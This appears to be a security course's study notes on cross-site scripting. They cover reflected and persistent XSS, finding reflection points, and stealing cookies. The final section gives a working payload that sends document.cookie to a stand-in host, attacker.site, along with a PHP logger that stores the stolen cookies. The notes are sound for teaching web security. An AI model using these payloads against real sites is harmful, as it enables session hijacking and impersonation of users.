# Cross Site Scripting

Cross Site Scripting (XSS) is a vulnerability that lets an attacker control some of the content of a web application

By exploiting a XSS, the attacker can target the web app users

An attacker can:

* Modify the content of the site at run-time
* Inject malicious contents
* Steal the cookies, thus the session, of a user
* Perform actions on the web app as if it was a legitimate user
* And much more

XSS vulnerabilities happen when a web app uses unfiltered user input to build the output content displayed to its users

This lets an attacker control the output HTML and JS code, thus attacking the app users

User input is any parameter coming from the client side of the web app such as:

* Request headers
* Cookies
* Form inputs
* POST parameters
* GET parameters

Such inputs should be validated server side by well-implemented security functions that should sanitize or filter users' input

{% hint style="danger" %}
Never, ever, trust user input!
{% endhint %}

Most of the time, victims of XSS attacks are the users/visitors of a site (could even be an admin)

XSS involves injecting malicious code into the output of a web page, which is then rendered (or executed) by the browser of the visiting users

It can be really hard to notice an attack in progress because most of the time, attacks are very subtle and do not involve any visible change to the vulnerable site

Attackers user XSS to attack the users of a website by:

* Making their browsers load malicious content
* Performing operations on their behalf, like buying a product or changing a password
* Stealing their session cookies, thus being able to impersonate them on the site

## Finding an XSS

You have to look at every user input, and test if it is somehow displayed on the output of the web application

![A search parameter is submitted through a form and gets displayed on the output (Reflection point). Searched string is passed through a GET parameter](<../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png>)

After finding a reflection point, you have to understand if you can inject HTML code and see if it somehow gets to the output of the page; this lets you control the output page

Looking at the HTML sources of the output page helps to understand how to build an XSS payload

![](<../../../../.gitbook/assets/image (4) (1) (1) (1).png>)

![The injected \<i> tag outputted "test string" in italics so the HTML has been interpreted](<../../../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1).png>)

To test the XSS, you can inject some valid HTML/JS code like:

```javascript
<script>alert('XSS')</script>
```

Although according to this video, we should be mindful when doing that

{% embed url="https://www.youtube.com/watch?t=73s&v=KHwVjzWei1c" %}

To exploit an XSS vulnerability, you need to know the type of XSS attack you are carrying out: reflected, persistent or DOM based

## Reflected XSS Attacks

Happen when the malicious payload is carried **inside the request** that the browser of the victim sends to the vulnerable website

Triggered by posting a link on a social network or via a phishing campaign. When users click on the link, they trigger the attack

Some browsers like Chrome have a reflected XSS filter built in so they will not run some XSS reflected attacks

![](<../../../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

However, they can only filter trivial and known XSS attacks since there are advanced methods that can bypass anti-XSS filters

## Persistent XSS Attacks

Cannot be blocked by Anti-XSS filters

Occur when the payload is sent to the vulnerable web server and then **stored**.&#x20;

* When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload.

Malicious code gets delivered each and every time a web browser hits the "injected" web page.

The most common vector for persistent attacks are HTML forms that submit content to the web server and then display that content back to the users

* Elements like comments, user profiles, and form posts are a potential vector for attacks

Example: If an attacker manages to inject a malicious script in a forum post, every person opening that post will run the script; this, for example, could let an attack silently steal visitors' cookies and impersonate them without even knowing their login credentials



## Cookie Stealing via XSS

JS can access cookies if they do not have the HttpOnly flag enabled

In many cases, stealing a cookie means stealing a user session

For example, you can display the current cookies using:

```javascript
<script>alert(document.cookie)</script>
```

![](<../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png>)

This code sends cookie content to an attacker-controlled site

```javascript
<script>
var i = new Image();
i.src="http://attacker.site/log.php?q="+document.cookie;
</script>
```

The script generates an image object and prints its `src` to a script on the attacker's server

The browser cannot tell in advance if the source is a real image, so it loads and executes the script, even without displaying any image which means the cookie is actually sent to the attacker.site

```php
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>
```

The `log.php` script saves the cookie in a text file on the attacker.site
